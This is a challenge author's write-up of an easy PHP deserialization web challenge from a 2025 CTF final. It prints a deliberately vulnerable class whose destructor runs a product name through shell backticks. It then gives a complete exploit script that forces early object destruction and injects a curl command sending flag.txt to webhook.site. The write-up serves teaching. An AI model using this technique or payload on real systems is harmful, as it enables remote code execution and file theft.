

+++
date = '2025-06-21T00:00:00+01:00'
draft = false
description= "This write-up covers the solution for the easy web challenge I created for the Midnight Flag CTF 2025 finals."
title = '[MidnightFlag CTF 2025 Final] - ShadowBazar'
tags = ["Web", "MidnightFlagCTF", "WriteUp"]
+++


| Difficulty | Easy                                                |
| ---------- | ----------------------------------------------------- |
| Author     | [Me](https://discordapp.com/users/406135822178320390) |

## 📝 Challenge description

You’ve stumbled upon a shady website template preview tool used by an underground syndicate to design their next-generation black-market storefronts. This preview system lets them test their illegal marketplace before going live, offering a glimpse into their operations—arms deals, drug trades, and crypto laundering services.

Your mission? Exploit the preview system, uncover hidden functionalities, and retrieve the secret flag before the site gets locked down.

The sources for this challenge can be found on [Github](https://github.com/MidnightFlag/2025-final-public-challenges/tree/master/web/ShadowBazar)

## ⚡ TL;DR

This challenge involves insecure PHP deserialization. The user must employ a specific trick to force a custom object to be destroyed prematurely, entering the `__destruct()` method to trigger RCE.

## 🔍 Steps

1. 💥 Triggering the destructor
2. 🚩 RCE

## 📂 Given Files

The challenge source code is provided to the players. However, only two files are actually relevant to solve it.

The first is `index.php`, which contains the web backend. It is quite simple: when a user first accesses the page, the backend creates a basket of three products, serializes it, and stores it in a cookie. If the user already has a basket assigned, the backend deserializes the cookie and displays its content.

`index.php`
```php
<?php

error_reporting(0);

require_once("objects/Products.php");

// Create a default product (Laptop)
$cryptolocker   = new Product(0, "CryptoLocker", "Advanced ransomware with AES-256 encryption & automated ransom negotiation.", 0.050, "images/cryptolocker.webp");
$crypto_mixer   = new Product(1, "Crypto Mixer", "Blend cryptocurrency transactions for enhanced privacy and laundering.", 0.003, "images/cryptomixer.webp");
$atm_skimmer    = new Product(2, "ATM Skimmer", "Covert device to capture credit card data and PINs.", 0.080, "images/atmskimmer.webp");

// Initialize error flag
$error = false;

// Check if the user has a valid 'Products' cookie
if (!isset($_COOKIE['Products']) || empty($_COOKIE['Products'])) {
    // Create a new products instance
    $products = new Products();
    $products->addProduct($cryptolocker, 2);
    $products->addProduct($crypto_mixer, 5);
    $products->addProduct($atm_skimmer, 3);

    // Store in cookie
    setcookie('Products', base64_encode(serialize($products)), time() + 30 * 24 * 60 * 60, '/');
} else {
    // Attempt to decode and unserialize
    $decoded = base64_decode($_COOKIE['Products'], true);
    if ($decoded === false) {
        $error = true;
    } else {
        $products = unserialize($decoded);
        if (!$products instanceof Products) {
            $error = true;
        }
    }

    // If deserialization fails, reset to default products
    if ($error) {
        $products = new Products();
        $products->addProduct($cryptolocker, 2);
        $products->addProduct($crypto_mixer, 5);
        $products->addProduct($atm_skimmer, 3);
        setcookie('Products', base64_encode(serialize($products)), time() + 30 * 24 * 60 * 60, '/');
    }
}

?>
```

The second and most interesting file is the `Product` class as it contains the sink to exploit this challenge.

`Products.php`
```php
<?php

class Product implements Serializable {

    private int $id;
    private string $name;
    private string $description;
    private float $price;
    private string $image;

    public function __construct(int $id, string $name, string $description, float $price, string $image) {
        $this->id = $id;
        $this->name = $name;
        $this->description = $description;
        $this->price = $price;
        $this->image = $image;
    }

    public function getId(): int { return $this->id; }
    public function getName(): string { return $this->name; }
    public function getDescription(): string { return $this->description; }
    public function getPrice(): float { return $this->price; }
    public function getImage(): string { return $this->image; }

    public function serialize(): string {
        return serialize([$this->id, $this->name, $this->description, $this->price, $this->image]);
    }

    public function unserialize(string $data): void {
        [$this->id, $this->name, $this->description, $this->price, $this->image] = unserialize($data);
    }

    // Used for backend debugging, users can't call it anyway
    public function __destruct() {
        $trace = debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 2);
        if (isset($trace[1]['function'])) {
            $debug_line = "echo ". $this->name.' has been destroyed at '.date('[Y-m-d H:i:s] '). "from " . $trace[1]['function']. "\n";
            file_put_contents("/tmp/logs.txt", `$debug_line`, FILE_APPEND | LOCK_EX);
        }
    }
}

// The code from this class is not really important as it is only used to store multiple "Product" in an array
class Products implements Serializable {
    private array $products = []; 

    public function addProduct(Product $product, int $quantity): void {
        $id = $product->getId();
        $this->products[$id] = ['product' => $product, 'quantity' => $quantity];
    }

    public function removeProduct(Product $product, int $quantity): void {
        assert($quantity >= 0, new InvalidArgumentException("Quantity must be positive."));
        $id = $product->getId();
        if (isset($this->products[$id]) && $this->products[$id]['quantity'] - $quantity == 0) {
            unset($this->products[$id]);
        } elseif (isset($this->products[$id]) && $this->products[$id]['quantity'] - $quantity >= 0) {
            $this->products[$id]['quantity'] -= $quantity;
        } else {
            throw new Exception("Product does not exist or quantity is invalid.");
        }
    }

    public function nextAvailableId(): int {
        return count($this->products);
    }

    public function getProducts(): array {
        return $this->products;
    }

    public function getTotal(): float {
        $total = 0;
        foreach ($this->products as $item) {
            $total += $item['product']->getPrice() * $item['quantity'];
        }
        return $total;
    }

    public function serialize(): string {
        return serialize($this->products);
    }

    public function unserialize(string $data): void {
        $this->products = unserialize($data);
    }
}

?>
```


## 💥 Step 1:  Triggering the destructor

Based on the source code, it is clear that the vulnerability lies in PHP deserialization. In `Products.php`, we can see that there is an interesting `__destruct()` function that, if entered correctly, can be used to trigger an RCE because of the backticks in `file_put_contents` and thus, get the flag. 

In PHP, backticks are used to execute shell commands : 
```php
php > echo `id`;
uid=1000(neoreo) gid=1000(neoreo) groups=1000(neoreo)
```

We must also understand that the __destruct() function is called whenever an object is destroyed. This happens when an object is explicitly unset, or when a variable pointing to an object is overwritten. As an example, unreferencing a PHP object using `unset()` will trigger the `__destruct()` function, overwriting a variable pointing to an object as well. After PHP has responded to a request, it destroys everything that has been created during the response process and not stored server-wide. Basically, objects are naturally destroyed at the end of each request. 

```php
// Used for backend debugging, users can't call it anyway
public function __destruct() {
    $trace = debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 2);
    if (isset($trace[1]['function'])) {
        $debug_line = "echo ". $this->name.' has been destroyed at '.date('[Y-m-d H:i:s] '). "from " . $trace[1]['function']. "\n";
        file_put_contents("/tmp/logs.txt", `$debug_line`, FILE_APPEND | LOCK_EX);
    }
}
```

The main challenge is that RCE can only be triggered after bypassing the `isset(debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 2)[1]['function'])` condition inside the `__destruct()` method. The purpose of this verification is actually simple: it filters natural destruction from the end of a request. So, we'll have to forge a PHP serial to force destruct a `Products` object.

One such method is to use something that I call `the array trick`. In PHP, arrays are serialized in the following way : 

```php
php > $array = ["value1","value2"];
php > echo serialize($array);
a:2:{i:0;s:6:"value1";i:1;s:6:"value2";}
```

For those who never looked at a PHP serial, it is quite simple. Serialized strings represent arrays as a series of `key;value` pairs. During the `unserialize()` process, PHP processes these from left to right. The trick lies in this mechanism. If we provide a custom serialized string where two different values are assigned to the same index, the second value will overwrite the first which will be destroyed.


Here is an example of an array with two values referenced by the same key/index.
```php
php > print_r(unserialize('a:2:{i:0;s:6:"value1";i:0;s:6:"value2";}'));
Array
(
    [0] => value2
)
```

## 🚩 Step 2: RCE

Now that we understand how to enter the `__destruct()` method. We can craft the payload that will trigger the RCE and exfiltrate the flag at `/flag.txt`.

`exploit.php`
```php
<?php
require('Products.php');

// We create a legitimate basket but the first product must contain the payload as its name
// The content of the second one doesn't matter, it is just there to overwrite the first object
$products = new Products();
$payload   = new Product(0, "$(curl http://webhook.site -F '=@/var/www/html/flag.txt')", "foo", 1337, "https://blog.neoreo.fr/favicon.ico");
$cryptolocker   = new Product(1, "CryptoLocker", "Advanced ransomware with AES-256 encryption & automated ransom negotiation.", 0.050, "images/cryptolocker.webp");
$products->addProduct($payload, 2);
$products->addProduct($cryptolocker, 2);

$serial = serialize($products);

// Overwrite the second object index with the first one to force __destruct() call
$malicious_serial = str_replace("i:1;a:2:","i:0;a:2:",$serial); 
$final_payload = base64_encode($malicious_serial);

// Send the payload
system("curl -X GET http://127.0.0.1:5000/ -H 'Cookie: Products=${final_payload}'")

?>
```

**Challenge solved**
Flag : `MCTF{F0rc1ng_0bj3ct_D3structi0n_70_C4ll_M4g1c_Funct10ns}`

**Unintended**  
While discussing the challenge with [`@labrosseadam`](https://x.com/adam_le_bon), she pointed out that providing an invalid serialized string can also trigger `__destruct()`. Since PHP's unserialize builds objects as it encounters them from left to right, if the process fails later in the string (e.g. due to a syntax error or a non-existent class), the already-created objects are destroyed immediately.